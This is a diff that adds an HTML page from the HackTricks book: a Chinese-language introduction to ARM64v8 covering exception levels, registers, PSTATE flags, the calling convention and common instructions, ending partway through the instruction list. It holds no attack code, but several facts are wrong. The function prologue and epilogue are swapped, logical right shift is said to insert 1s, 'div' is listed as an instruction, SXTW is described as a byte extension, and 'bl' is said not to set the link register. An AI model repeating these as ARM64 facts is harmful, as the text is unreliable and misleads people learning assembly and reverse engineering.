@@ -1,0 +1,957 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Introduction to ARM64v8</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../highlight.css">
+        <link rel="stylesheet" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="introduction-to-arm64v8"><a class="header" href="#introduction-to-arm64v8">Introduction to ARM64v8</a></h1>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="异常级别---el-arm64v8"><a class="header" href="#异常级别---el-arm64v8"><strong>异常级别 - EL (ARM64v8)</strong></a></h2>
+<p>在 ARMv8 架构中，执行级别称为异常级别（ELs），定义了执行环境的特权级别和能力。共有四个异常级别，从 EL0 到 EL3，每个级别有不同的用途：</p>
+<ol>
+<li><strong>EL0 - 用户模式</strong>：</li>
+</ol>
+<ul>
+<li>这是特权级别最低的级别，用于执行常规应用程序代码。</li>
+<li>在 EL0 运行的应用程序相互隔离，并与系统软件隔离，从而增强安全性和稳定性。</li>
+</ul>
+<ol start="2">
+<li><strong>EL1 - 操作系统内核模式</strong>：</li>
+</ol>
+<ul>
+<li>大多数操作系统内核在此级别运行。</li>
+<li>EL1 的特权高于 EL0，可以访问系统资源，但有一些限制以确保系统完整性。</li>
+</ul>
+<ol start="3">
+<li><strong>EL2 - 虚拟机监控器模式</strong>：</li>
+</ol>
+<ul>
+<li>此级别用于虚拟化。在 EL2 运行的虚拟机监控器可以管理多个操作系统（每个操作系统在自己的 EL1 中）在同一物理硬件上运行。</li>
+<li>EL2 提供了隔离和控制虚拟化环境的功能。</li>
+</ul>
+<ol start="4">
+<li><strong>EL3 - 安全监控模式</strong>：</li>
+</ol>
+<ul>
+<li>这是特权级别最高的级别，通常用于安全启动和受信执行环境。</li>
+<li>EL3 可以管理和控制安全状态与非安全状态之间的访问（例如安全启动、受信操作系统等）。</li>
+</ul>
+<p>使用这些级别可以以结构化和安全的方式管理系统的不同方面，从用户应用程序到最特权的系统软件。ARMv8 对特权级别的处理有助于有效隔离不同的系统组件，从而增强系统的安全性和稳健性。</p>
+<h2 id="寄存器-arm64v8"><a class="header" href="#寄存器-arm64v8"><strong>寄存器 (ARM64v8)</strong></a></h2>
+<p>ARM64 有 <strong>31 个通用寄存器</strong>，标记为 <code>x0</code> 到 <code>x30</code>。每个寄存器可以存储一个 <strong>64 位</strong>（8 字节）值。对于只需要 32 位值的操作，可以使用 w0 到 w30 的名称以 32 位模式访问相同的寄存器。</p>
+<ol>
+<li><strong><code>x0</code></strong> 到 <strong><code>x7</code></strong> - 这些通常用作临时寄存器，并用于将参数传递给子例程。</li>
+</ol>
+<ul>
+<li><strong><code>x0</code></strong> 还携带函数的返回数据。</li>
+</ul>
+<ol start="2">
+<li><strong><code>x8</code></strong> - 在 Linux 内核中，<code>x8</code> 用作 <code>svc</code> 指令的系统调用号。<strong>在 macOS 中使用的是 x16！</strong></li>
+<li><strong><code>x9</code></strong> 到 <strong><code>x15</code></strong> - 更多的临时寄存器，通常用于局部变量。</li>
+<li><strong><code>x16</code></strong> 和 <strong><code>x17</code></strong> - <strong>过程内调用寄存器</strong>。用于立即值的临时寄存器。它们也用于间接函数调用和 PLT（过程链接表）存根。</li>
+</ol>
+<ul>
+<li><strong><code>x16</code></strong> 在 <strong>macOS</strong> 中用作 <strong><code>svc</code></strong> 指令的 <strong>系统调用号</strong>。</li>
+</ul>
+<ol start="5">
+<li><strong><code>x18</code></strong> - <strong>平台寄存器</strong>。可以用作通用寄存器，但在某些平台上，此寄存器保留用于平台特定用途：在 Windows 中指向当前线程环境块，或指向当前 <strong>执行任务结构在 Linux 内核</strong>。</li>
+<li><strong><code>x19</code></strong> 到 <strong><code>x28</code></strong> - 这些是被调用者保存的寄存器。函数必须为其调用者保留这些寄存器的值，因此它们存储在堆栈中，并在返回调用者之前恢复。</li>
+<li><strong><code>x29</code></strong> - <strong>帧指针</strong>，用于跟踪堆栈帧。当由于调用函数而创建新的堆栈帧时，<strong><code>x29</code></strong> 寄存器会 <strong>存储在堆栈中</strong>，并且 <strong>新的</strong> 帧指针地址（<strong><code>sp</code></strong> 地址）会 <strong>存储在此寄存器中</strong>。</li>
+</ol>
+<ul>
+<li>此寄存器也可以用作 <strong>通用寄存器</strong>，尽管通常用作对 <strong>局部变量</strong> 的引用。</li>
+</ul>
+<ol start="8">
+<li><strong><code>x30</code></strong> 或 <strong><code>lr</code></strong> - <strong>链接寄存器</strong>。它在执行 <code>BL</code>（带链接的分支）或 <code>BLR</code>（带链接到寄存器的分支）指令时保存 <strong>返回地址</strong>，通过将 <strong><code>pc</code></strong> 值存储在此寄存器中。</li>
+</ol>
+<ul>
+<li>它也可以像其他寄存器一样使用。</li>
+<li>如果当前函数将调用新函数并因此覆盖 <code>lr</code>，它将在开始时将其存储在堆栈中，这是尾声（<code>stp x29, x30 , [sp, #-48]; mov x29, sp</code> -&gt; 存储 <code>fp</code> 和 <code>lr</code>，生成空间并获取新 <code>fp</code>）并在结束时恢复，这是序言（<code>ldp x29, x30, [sp], #48; ret</code> -&gt; 恢复 <code>fp</code> 和 <code>lr</code> 并返回）。</li>
+</ul>
+<ol start="9">
+<li><strong><code>sp</code></strong> - <strong>堆栈指针</strong>，用于跟踪堆栈的顶部。</li>
+</ol>
+<ul>
+<li><strong><code>sp</code></strong> 值应始终保持至少为 <strong>四字</strong> <strong>对齐</strong>，否则可能会发生对齐异常。</li>
+</ul>
+<ol start="10">
+<li><strong><code>pc</code></strong> - <strong>程序计数器</strong>，指向下一条指令。此寄存器只能通过异常生成、异常返回和分支进行更新。唯一可以读取此寄存器的普通指令是带链接的分支指令（BL，BLR），以将 <strong><code>pc</code></strong> 地址存储在 <strong><code>lr</code></strong>（链接寄存器）中。</li>
+<li><strong><code>xzr</code></strong> - <strong>零寄存器</strong>。在其 <strong>32</strong> 位寄存器形式中也称为 <strong><code>wzr</code></strong>。可以用来轻松获取零值（常见操作）或使用 <strong><code>subs</code></strong> 进行比较，如 <strong><code>subs XZR, Xn, #10</code></strong>，将结果数据存储在无处（在 <strong><code>xzr</code></strong> 中）。</li>
+</ol>
+<p><strong><code>Wn</code></strong> 寄存器是 <strong><code>Xn</code></strong> 寄存器的 <strong>32 位</strong> 版本。</p>
+<h3 id="simd-和浮点寄存器"><a class="header" href="#simd-和浮点寄存器">SIMD 和浮点寄存器</a></h3>
+<p>此外，还有另外 <strong>32 个 128 位长度的寄存器</strong>，可用于优化的单指令多数据（SIMD）操作和执行浮点运算。这些称为 Vn 寄存器，尽管它们也可以以 <strong>64</strong> 位、<strong>32</strong> 位、<strong>16</strong> 位和 <strong>8</strong> 位操作，然后称为 <strong><code>Qn</code></strong>、<strong><code>Dn</code></strong>、<strong><code>Sn</code></strong>、<strong><code>Hn</code></strong> 和 <strong><code>Bn</code></strong>。</p>
+<h3 id="系统寄存器"><a class="header" href="#系统寄存器">系统寄存器</a></h3>
+<p><strong>有数百个系统寄存器</strong>，也称为特殊用途寄存器（SPRs），用于 <strong>监控</strong> 和 <strong>控制</strong> <strong>处理器</strong> 行为。<br />
+它们只能通过专用特殊指令 <strong><code>mrs</code></strong> 和 <strong><code>msr</code></strong> 进行读取或设置。</p>
+<p>特殊寄存器 <strong><code>TPIDR_EL0</code></strong> 和 <strong><code>TPIDDR_EL0</code></strong> 在逆向工程中常见。<code>EL0</code> 后缀表示可以访问寄存器的 <strong>最小异常</strong>（在这种情况下，EL0 是常规程序运行的常规异常（特权）级别）。<br />
+它们通常用于存储内存中 <strong>线程局部存储</strong> 区域的 <strong>基地址</strong>。通常，第一个寄存器对在 EL0 中运行的程序可读可写，但第二个寄存器可以从 EL0 读取并从 EL1 写入（如内核）。</p>
+<ul>
+<li><code>mrs x0, TPIDR_EL0 ; 将 TPIDR_EL0 读取到 x0</code></li>
+<li><code>msr TPIDR_EL0, X0 ; 将 x0 写入 TPIDR_EL0</code></li>
+</ul>
+<h3 id="pstate"><a class="header" href="#pstate"><strong>PSTATE</strong></a></h3>
+<p><strong>PSTATE</strong> 包含多个进程组件，序列化到操作系统可见的 <strong><code>SPSR_ELx</code></strong> 特殊寄存器中，X 是触发异常的 <strong>权限</strong> <strong>级别</strong>（这允许在异常结束时恢复进程状态）。<br />
+这些是可访问的字段：</p>
+<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>
+<ul>
+<li><strong><code>N</code></strong>、<strong><code>Z</code></strong>、<strong><code>C</code></strong> 和 <strong><code>V</code></strong> 条件标志：</li>
+<li><strong><code>N</code></strong> 表示操作产生了负结果</li>
+<li><strong><code>Z</code></strong> 表示操作产生了零</li>
+<li><strong><code>C</code></strong> 表示操作产生了进位</li>
+<li><strong><code>V</code></strong> 表示操作产生了有符号溢出：</li>
+<li>两个正数的和产生负结果。</li>
+<li>两个负数的和产生正结果。</li>
+<li>在减法中，当从较小的正数中减去较大的负数（或反之），且结果无法在给定位大小的范围内表示时。</li>
+<li>显然，处理器不知道操作是有符号的还是无符号的，因此它将在操作中检查 C 和 V，并在发生进位的情况下指示。</li>
+</ul>
+<p>{% hint style="warning" %}
+并非所有指令都会更新这些标志。一些指令如 <strong><code>CMP</code></strong> 或 <strong><code>TST</code></strong> 会更新，其他带有 s 后缀的指令如 <strong><code>ADDS</code></strong> 也会更新。
+{% endhint %}</p>
+<ul>
+<li>当前 <strong>寄存器宽度 (<code>nRW</code>) 标志</strong>：如果标志的值为 0，则程序在恢复后将以 AArch64 执行状态运行。</li>
+<li>当前 <strong>异常级别</strong> (<strong><code>EL</code></strong>)：在 EL0 中运行的常规程序将具有值 0。</li>
+<li><strong>单步执行</strong> 标志 (<strong><code>SS</code></strong>)：由调试器使用，通过在异常中将 SS 标志设置为 1 来单步执行。程序将执行一步并发出单步异常。</li>
+<li><strong>非法异常</strong> 状态标志 (<strong><code>IL</code></strong>)：用于标记特权软件执行无效异常级别转移时，此标志设置为 1，处理器触发非法状态异常。</li>
+<li><strong><code>DAIF</code></strong> 标志：这些标志允许特权程序选择性地屏蔽某些外部异常。</li>
+<li>如果 <strong><code>A</code></strong> 为 1，则表示将触发 <strong>异步中止</strong>。<strong><code>I</code></strong> 配置为响应外部硬件 <strong>中断请求</strong>（IRQ）。F 与 <strong>快速中断请求</strong>（FIR）相关。</li>
+<li><strong>堆栈指针选择</strong> 标志 (<strong><code>SPS</code></strong>)：在 EL1 及以上运行的特权程序可以在使用自己的堆栈指针寄存器和用户模型之间切换（例如，在 <code>SP_EL1</code> 和 <code>EL0</code> 之间）。此切换通过写入 <strong><code>SPSel</code></strong> 特殊寄存器执行。此操作无法从 EL0 完成。</li>
+</ul>
+<h2 id="调用约定-arm64v8"><a class="header" href="#调用约定-arm64v8"><strong>调用约定 (ARM64v8)</strong></a></h2>
+<p>ARM64 调用约定规定，<strong>前八个参数</strong>通过寄存器 <strong><code>x0</code> 到 <code>x7</code></strong> 传递。<strong>额外</strong>参数通过 <strong>堆栈</strong> 传递。<strong>返回</strong>值通过寄存器 <strong><code>x0</code></strong> 返回，或者在 <strong><code>x1</code></strong> 中返回 <strong>如果其长度为 128 位</strong>。<strong><code>x19</code></strong> 到 <strong><code>x30</code></strong> 和 <strong><code>sp</code></strong> 寄存器必须在函数调用之间 <strong>保留</strong>。</p>
+<p>在阅读汇编中的函数时，查找 <strong>函数序言和尾声</strong>。<strong>序言</strong> 通常涉及 <strong>保存帧指针（<code>x29</code>）</strong>、<strong>设置</strong> 新的 <strong>帧指针</strong> 和 <strong>分配堆栈空间</strong>。<strong>尾声</strong> 通常涉及 <strong>恢复保存的帧指针</strong> 和 <strong>从函数返回</strong>。</p>
+<h3 id="swift-中的调用约定"><a class="header" href="#swift-中的调用约定">Swift 中的调用约定</a></h3>
+<p>Swift 有其自己的 <strong>调用约定</strong>，可以在 <a href="https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64"><strong>https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64</strong></a> 中找到。</p>
+<h2 id="常见指令-arm64v8"><a class="header" href="#常见指令-arm64v8"><strong>常见指令 (ARM64v8)</strong></a></h2>
+<p>ARM64 指令通常具有 <strong>格式 <code>opcode dst, src1, src2</code></strong>，其中 <strong><code>opcode</code></strong> 是要执行的 <strong>操作</strong>（如 <code>add</code>、<code>sub</code>、<code>mov</code> 等），<strong><code>dst</code></strong> 是 <strong>目标</strong> 寄存器，结果将存储在此寄存器中，<strong><code>src1</code></strong> 和 <strong><code>src2</code></strong> 是 <strong>源</strong> 寄存器。立即数值也可以替代源寄存器使用。</p>
+<ul>
+<li><strong><code>mov</code></strong>：<strong>移动</strong>一个值从一个 <strong>寄存器</strong> 到另一个。</li>
+<li>示例：<code>mov x0, x1</code> — 这将值从 <code>x1</code> 移动到 <code>x0</code>。</li>
+<li><strong><code>ldr</code></strong>：<strong>加载</strong>一个值从 <strong>内存</strong> 到 <strong>寄存器</strong>。</li>
+<li>示例：<code>ldr x0, [x1]</code> — 这将从 <code>x1</code> 指向的内存位置加载一个值到 <code>x0</code>。</li>
+<li><strong>偏移模式</strong>：指示影响原始指针的偏移，例如：</li>
+<li><code>ldr x2, [x1, #8]</code>，这将加载 <code>x1 + 8</code> 的值到 <code>x2</code>。</li>
+<li><code>ldr x2, [x0, x1, lsl #2]</code>，这将从数组 <code>x0</code> 中加载一个对象，从位置 <code>x1</code>（索引） * 4。</li>
+<li><strong>预索引模式</strong>：这将对原始值应用计算，获取结果并将新原始值存储在原始值中。</li>
+<li><code>ldr x2, [x1, #8]!</code>，这将加载 <code>x1 + 8</code> 到 <code>x2</code> 并将结果存储在 <code>x1</code> 中。</li>
+<li><code>str lr, [sp, #-4]!</code>，将链接寄存器存储在 sp 中并更新寄存器 sp。</li>
+<li><strong>后索引模式</strong>：这类似于前一个，但内存地址被访问，然后计算并存储偏移。</li>
+<li><code>ldr x0, [x1], #8</code>，加载 <code>x1</code> 到 <code>x0</code> 并用 <code>x1 + 8</code> 更新 <code>x1</code>。</li>
+<li><strong>PC 相对寻址</strong>：在这种情况下，加载的地址相对于 PC 寄存器计算。</li>
+<li><code>ldr x1, =_start</code>，这将加载 <code>_start</code> 符号开始的地址到 <code>x1</code>，与当前 PC 相关。</li>
+<li><strong><code>str</code></strong>：<strong>存储</strong>一个值从 <strong>寄存器</strong> 到 <strong>内存</strong>。</li>
+<li>示例：<code>str x0, [x1]</code> — 这将值存储在 <code>x0</code> 中到 <code>x1</code> 指向的内存位置。</li>
+<li><strong><code>ldp</code></strong>：<strong>加载寄存器对</strong>。此指令 <strong>从连续内存</strong> 位置 <strong>加载两个寄存器</strong>。内存地址通常通过将偏移添加到另一个寄存器的值来形成。</li>
+<li>示例：<code>ldp x0, x1, [x2]</code> — 这将从 <code>x2</code> 和 <code>x2 + 8</code> 的内存位置加载 <code>x0</code> 和 <code>x1</code>。</li>
+<li><strong><code>stp</code></strong>：<strong>存储寄存器对</strong>。此指令 <strong>将两个寄存器存储到</strong> 连续内存位置。内存地址通常通过将偏移添加到另一个寄存器的值来形成。</li>
+<li>示例：<code>stp x0, x1, [sp]</code> — 这将 <code>x0</code> 和 <code>x1</code> 存储到 <code>sp</code> 和 <code>sp + 8</code> 的内存位置。</li>
+<li><code>stp x0, x1, [sp, #16]!</code> — 这将 <code>x0</code> 和 <code>x1</code> 存储到 <code>sp+16</code> 和 <code>sp + 24</code> 的内存位置，并用 <code>sp+16</code> 更新 <code>sp</code>。</li>
+<li><strong><code>add</code></strong>：<strong>将</strong>两个寄存器的值相加并将结果存储在一个寄存器中。</li>
+<li>语法：add(s) Xn1, Xn2, Xn3 | #imm, [shift #N | RRX]</li>
+<li>Xn1 -&gt; 目标</li>
+<li>Xn2 -&gt; 操作数 1</li>
+<li>Xn3 | #imm -&gt; 操作数 2（寄存器或立即数）</li>
+<li>[shift #N | RRX] -&gt; 执行移位或调用 RRX</li>
+<li>示例：<code>add x0, x1, x2</code> — 这将 <code>x1</code> 和 <code>x2</code> 中的值相加并将结果存储在 <code>x0</code> 中。</li>
+<li><code>add x5, x5, #1, lsl #12</code> — 这等于 4096（1 左移 12 次） -&gt; 1 0000 0000 0000 0000。</li>
+<li><strong><code>adds</code></strong> 这执行一个 <code>add</code> 并更新标志。</li>
+<li><strong><code>sub</code></strong>：<strong>减去</strong>两个寄存器的值并将结果存储在一个寄存器中。</li>
+<li>检查 <strong><code>add</code></strong> <strong>语法</strong>。</li>
+<li>示例：<code>sub x0, x1, x2</code> — 这将从 <code>x1</code> 中减去 <code>x2</code> 的值并将结果存储在 <code>x0</code> 中。</li>
+<li><strong><code>subs</code></strong> 这类似于减法，但更新标志。</li>
+<li><strong><code>mul</code></strong>：<strong>乘以</strong>两个寄存器的值并将结果存储在一个寄存器中。</li>
+<li>示例：<code>mul x0, x1, x2</code> — 这将 <code>x1</code> 和 <code>x2</code> 中的值相乘并将结果存储在 <code>x0</code> 中。</li>
+<li><strong><code>div</code></strong>：<strong>将</strong>一个寄存器的值除以另一个并将结果存储在一个寄存器中。</li>
+<li>示例：<code>div x0, x1, x2</code> — 这将 <code>x1</code> 的值除以 <code>x2</code> 并将结果存储在 <code>x0</code> 中。</li>
+<li><strong><code>lsl</code></strong>、<strong><code>lsr</code></strong>、<strong><code>asr</code></strong>、<strong><code>ror</code>, <code>rrx</code></strong>：</li>
+<li><strong>逻辑左移</strong>：从末尾添加 0，移动其他位向前（乘以 n 次 2）。</li>
+<li><strong>逻辑右移</strong>：在开头添加 1，移动其他位向后（无符号除以 n 次 2）。</li>
+<li><strong>算术右移</strong>：类似于 <strong><code>lsr</code></strong>，但如果最高有效位为 1，则添加 1（有符号除以 n 次 2）。</li>
+<li><strong>右旋转</strong>：类似于 <strong><code>lsr</code></strong>，但从右侧移除的位附加到左侧。</li>
+<li><strong>带扩展的右旋转</strong>：类似于 <strong><code>ror</code></strong>，但将进位标志作为“最高有效位”。因此，进位标志移动到位 31，移除的位移动到进位标志。</li>
+<li><strong><code>bfm</code></strong>：<strong>位域移动</strong>，这些操作 <strong>从一个值复制位 <code>0...n</code></strong> 并将其放置在 <strong><code>m..m+n</code></strong> 的位置。<strong><code>#s</code></strong> 指定 <strong>最左边的位</strong> 位置，<strong><code>#r</code></strong> 指定 <strong>右旋转量</strong>。</li>
+<li>位域移动：<code>BFM Xd, Xn, #r</code></li>
+<li>有符号位域移动：<code>SBFM Xd, Xn, #r, #s</code></li>
+<li>无符号位域移动：<code>UBFM Xd, Xn, #r, #s</code></li>
+<li><strong>位域提取和插入</strong>：从一个寄存器复制位域并将其复制到另一个寄存器。</li>
+<li><strong><code>BFI X1, X2, #3, #4</code></strong> 从 X1 的第 3 位插入 X2 的 4 位。</li>
+<li><strong><code>BFXIL X1, X2, #3, #4</code></strong> 从 X2 的第 3 位提取 4 位并复制到 X1。</li>
+<li><strong><code>SBFIZ X1, X2, #3, #4</code></strong> 从 X2 中提取 4 位并插入到 X1，从第 3 位开始，右侧位清零。</li>
+<li><strong><code>SBFX X1, X2, #3, #4</code></strong> 从 X2 的第 3 位提取 4 位，进行符号扩展，并将结果放入 X1。</li>
+<li><strong><code>UBFIZ X1, X2, #3, #4</code></strong> 从 X2 中提取 4 位并插入到 X1，从第 3 位开始，右侧位清零。</li>
+<li><strong><code>UBFX X1, X2, #3, #4</code></strong> 从 X2 的第 3 位提取 4 位并将零扩展的结果放入 X1。</li>
+<li><strong>符号扩展到 X</strong>：扩展一个值的符号（或在无符号版本中仅添加 0），以便能够与其执行操作：</li>
+<li><strong><code>SXTB X1, W2</code></strong> 将 W2 的字节符号扩展到 X1（<code>W2</code> 是 <code>X2</code> 的一半），以填充 64 位。</li>
+<li><strong><code>SXTH X1, W2</code></strong> 将 W2 的 16 位数的符号扩展到 X1，以填充 64 位。</li>
+<li><strong><code>SXTW X1, W2</code></strong> 将 W2 的字节符号扩展到 X1，以填充 64 位。</li>
+<li><strong><code>UXTB X1, W2</code></strong> 将 0（无符号）添加到 W2 的字节中，以填充 64 位。</li>
+<li><strong><code>extr</code></strong>：从指定的 <strong>连接的寄存器对</strong> 中提取位。</li>
+<li>示例：<code>EXTR W3, W2, W1, #3</code> 这将 <strong>连接 W1+W2</strong> 并获取 <strong>从 W2 的第 3 位到 W1 的第 3 位</strong> 并将其存储在 W3 中。</li>
+<li><strong><code>cmp</code></strong>：<strong>比较</strong>两个寄存器并设置条件标志。它是 <strong><code>subs</code></strong> 的 <strong>别名</strong>，将目标寄存器设置为零寄存器。用于知道 <code>m == n</code>。</li>
+<li>它支持 <strong>与 <code>subs</code> 相同的语法</strong>。</li>
+<li>示例：<code>cmp x0, x1</code> — 这将比较 <code>x0</code> 和 <code>x1</code> 中的值，并相应地设置条件标志。</li>
+<li><strong><code>cmn</code></strong>：<strong>比较负</strong>操作数。在这种情况下，它是 <strong><code>adds</code></strong> 的 <strong>别名</strong>，并支持相同的语法。用于知道 <code>m == -n</code>。</li>
+<li><strong><code>ccmp</code></strong>：条件比较，它是仅在先前比较为真时执行的比较，并将特定设置 nzcv 位。</li>
+<li><code>cmp x1, x2; ccmp x3, x4, 0, NE; blt _func</code> -&gt; 如果 x1 != x2 且 x3 &lt; x4，则跳转到 func。</li>
+<li>这是因为 <strong><code>ccmp</code></strong> 仅在 <strong>先前的 <code>cmp</code> 为 <code>NE</code></strong> 时执行，如果不是，则位 <code>nzcv</code> 将设置为 0（这不会满足 <code>blt</code> 比较）。</li>
+<li>这也可以用作 <code>ccmn</code>（相同但为负，如 <code>cmp</code> 与 <code>cmn</code>）。</li>
+<li><strong><code>tst</code></strong>：检查比较的值是否都为 1（它的工作方式类似于不存储结果的 ANDS）。用于检查寄存器与值的比较，并检查寄存器中指示的任何位是否为 1。</li>
+<li>示例：<code>tst X1, #7</code> 检查 X1 的最后 3 位是否有 1。</li>
+<li><strong><code>teq</code></strong>：XOR 操作，丢弃结果。</li>
+<li><strong><code>b</code></strong>：无条件分支。</li>
+<li>示例：<code>b myFunction</code>。</li>
+<li>注意，这不会用返回地址填充链接寄存器（不适合需要返回的子例程调用）。</li>
+<li><strong><code>bl</code></strong>：<strong>带链接的分支</strong>，用于 <strong>调用</strong> <strong>子例程</strong>。将 <strong>返回地址存储在 <code>x30</code></strong> 中。</li>
+<li>示例：<code>bl myFunction</code> — 这将调用函数 <code>myFunction</code> 并将返回地址存储在 <code>x30</code> 中。</li>
+<li>注意，这不会用返回地址填充链接寄存器（不适合需要返回的子例程调用）。</li>
+<li><strong><code>blr</code></strong>：<strong>带链接的分支到寄存器</strong>，用于 <strong>调用</strong> <strong>子例程</strong>，目标在 <strong>寄存器</strong> 中 <strong>指定</strong>。将返回地址存储在 <code>x30</code> 中。</li>
+<li>示例：<code>blr x1</code> — 这将调用地址在 <code>x1</code> 中的函数，并将返回地址存储在 <code>x30</code> 中。</li>
+<li><strong><code>ret</code></strong>：<strong>从子例程返回</strong>，通常使用 <strong><code>x30</code></strong> 中的地址。</li>
+<li>示例：<code>ret</code> — 这将使用 <code>x30</code> 中的返回地址从当前子例程返回。</li>
